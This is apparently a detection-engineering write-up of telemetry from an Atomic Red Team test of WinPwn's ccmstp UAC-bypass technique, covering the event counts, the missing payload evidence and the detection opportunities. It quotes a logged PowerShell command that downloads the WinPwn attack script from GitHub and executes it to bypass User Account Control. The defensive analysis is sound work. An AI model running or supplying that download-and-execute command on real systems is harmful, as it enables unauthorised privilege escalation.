# T1548.002-19: Bypass User Account Control — WinPwn UAC Bypass ccmstp Technique

## Technique Context

This test uses WinPwn's `ccmstp` UAC bypass technique. `ccmstp.exe` (Configuration Manager
client setup tool, part of Microsoft Endpoint Configuration Manager / SCCM) is typically
absent on most endpoints — if present, it is marked as auto-elevate. WinPwn's ccmstp technique
either exploits a DLL search order issue with `ccmstp.exe` when it's present, or falls back
to a related COM/registry abuse. The test downloads WinPwn from GitHub and executes:
`UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp`

This test uses `calc.exe` as the payload target rather than `cmd.exe` (as in tests 18 and 20),
which is a meaningful variation for detection: `calc.exe` would be anomalous as a privileged
child of a UAC bypass.

## What This Dataset Contains

**Sysmon (39 events):** EIDs 7 (ImageLoad, 19), 1 (ProcessCreate, 4), 22 (DnsQuery, 4),
11 (FileCreate, 3), 13 (RegistryValueSet, 3), 10 (ProcessAccess, 3), 17 (PipeCreate, 2),
3 (NetworkConnect, 1).

Key process-create events (EID 1):
- `WmiPrvSE.exe` (`C:\Windows\System32\wbem\wmiprvse.exe -Embedding`) spawned by `svchost.exe`
  (DcomLaunch), tagged `technique_id=T1047,technique_name=Windows Management Instrumentation`
  — WMI Provider Host activation, indicating WinPwn uses WMI as part of its ccmstp technique
- `whoami.exe` — ART post-check, parent `powershell.exe`

Security EID 4688 records show the WinPwn `powershell.exe` invocation:
`"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
`UACBypass -noninteractive -command ""C:\windows\system32\calc.exe"" -technique ccmstp}`

EID 22 (DnsQuery, 4 events) — DNS lookups observed during the WinPwn execution. The
network-level activity reflects the script's download and any WMI-triggered lookups.

EID 13 (RegistryValueSet, 3) shows:
- `spoolsv.exe` setting `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Ports\Ne00:`
  (print spooler ambient activity)
- Additional registry writes during the test window

EID 1 — `WmiPrvSE.exe` activation: `C:\Windows\system32\wbem\wmiprvse.exe -Embedding`,
parent `svchost.exe -k DcomLaunch -p`, user `NT AUTHORITY\NETWORK SERVICE` — WMI is invoked
as part of the ccmstp technique, which is unique among the WinPwn techniques in this batch.

EID 3 (NetworkConnect, 1): `powershell.exe` → `185.199.109.133:443` — GitHub CDN for
the WinPwn script download.

**Security (28 events):** EIDs 4799 (19), 4798 (5), 4688 (4).

EID 4688 events: `WmiPrvSE.exe` (parent `svchost.exe`, user `NT AUTHORITY\NETWORK SERVICE`),
`whoami.exe` (pre-check), WinPwn `powershell.exe` with the ccmstp command line, `whoami.exe`
(post-check).

EID 4798 (A user's local group membership was enumerated, 5): `WmiPrvSE.exe` (PID 0x1064)
enumerating local group membership for `Administrator`, `DefaultAccount`, `Guest`, `mm11711`,
and `WDAGUtilityAccount` — this is WinPwn's ccmstp technique using WMI to enumerate local
accounts as part of its privilege escalation logic.

EID 4799 (A security-enabled local group membership was enumerated, 19): `cribl.exe` (Cribl
Edge, PID 0x15f4) enumerating all 19 local built-in security groups — this is Cribl Edge's
periodic group membership poll, not technique activity. Groups covered include Administrators,
Backup Operators, Cryptographic Operators, Distributed COM Users, Event Log Readers, Guests,
Hyper-V Administrators, Users, and more. This is ambient infrastructure telemetry.

**PowerShell (112 events):** EIDs 4104 (109), 4103 (2), 4100 (1). Same WinPwn script-block
logging pattern as test 18 (magic technique). The 109 EID 4104 events contain the full WinPwn
module source code.

## What This Dataset Does Not Contain

**No calc.exe process create.** The intended payload (`calc.exe`) does not appear as a process
create event, meaning either the bypass technique did not successfully spawn the elevated
payload, or the process was not captured in the Sysmon include filter window.

**No ccmstp.exe on this host.** SCCM client is not installed on ACME-WS06; `ccmstp.exe` is
absent. WinPwn's ccmstp technique gracefully fails or pivots to an alternative when the target
binary is missing — which is consistent with the WMI-based fallback activity visible in EID
4798/4799 and the WmiPrvSE.exe process create.

**No WMI execution child process.** Despite the WmiPrvSE.exe activation visible in EID 4688
and Sysmon EID 1 (tagged T1047), no child processes launched by WMI are present in the
samples — confirming the ccmstp technique did not successfully execute a payload via WMI.

## Assessment

This is the richest Security event dataset in the T1548.002 batch: 28 Security events vs.
10 in the defended run. The expansion is driven by the 19 EID 4799 events from Cribl Edge's
group membership enumeration — ambient telemetry that overlaps with the technique window.
The 5 EID 4798 events from `WmiPrvSE.exe` enumerating user accounts are genuine technique
artifacts: WinPwn's ccmstp approach uses WMI-based user and group discovery. The WMI activation
visible in both Sysmon EID 1 (WmiPrvSE.exe) and Security EID 4688 differentiates this test
from all others in the batch. The calc.exe target payload choice is an interesting ART test
design decision that would produce easily observable evidence in any environment where Sysmon
or Security auditing captures `calc.exe` spawned by a non-standard parent.

## Detection Opportunities Present in This Data

- **Security EID 4688:** WinPwn `powershell.exe` command line containing
  `UACBypass -technique ccmstp` — specific technique identifier.
- **Security EID 4688:** `WmiPrvSE.exe -Embedding` launched by `svchost.exe -k DcomLaunch`
  during the same time window as the WinPwn download and execution.
- **Security EID 4798:** `WmiPrvSE.exe` enumerating local user account group memberships
  (`Administrator`, `Guest`, `mm11711`) — WMI-driven account enumeration from a WMI Provider
  Host process activated by a non-administrative workload.
- **Sysmon EID 3:** `powershell.exe` → `185.199.109.133:443` (GitHub raw CDN) from
  `NT AUTHORITY\SYSTEM` context.
- **Correlation:** The sequence of WinPwn download → WmiPrvSE.exe activation → EID 4798
  user enumeration within a 15-second window is a strong behavioral pattern for this technique.
